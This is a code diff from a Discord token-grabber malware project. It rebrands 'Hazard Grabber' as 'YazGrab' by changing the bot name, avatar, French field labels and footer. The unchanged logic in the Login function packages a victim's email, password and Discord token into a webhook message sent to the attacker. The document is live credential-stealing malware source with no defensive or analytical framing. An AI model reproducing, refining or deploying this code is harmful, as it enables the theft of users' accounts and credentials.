@@ -140,21 +140,21 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Token Grab",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://c.tenor.com/piJFxYFioKIAAAAC/hacker-elliot-alderson.gif",
             embeds: [
                 {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Account Info**",
-                            "value": `Email: ${email} - Password: ${password}`,
+                            "name": "__Info du Compte__",
+                            "value": `**Email:** ${email}   -   **Password:** ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "name": "__Token__",
+                            "value": `\`**${token}**\``,
                             "inline": false
                         }
                     ],
@@ -163,7 +163,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "YazGrab - Remasterized of HazardTokenGraberV2"
                     }
                 }
             ]
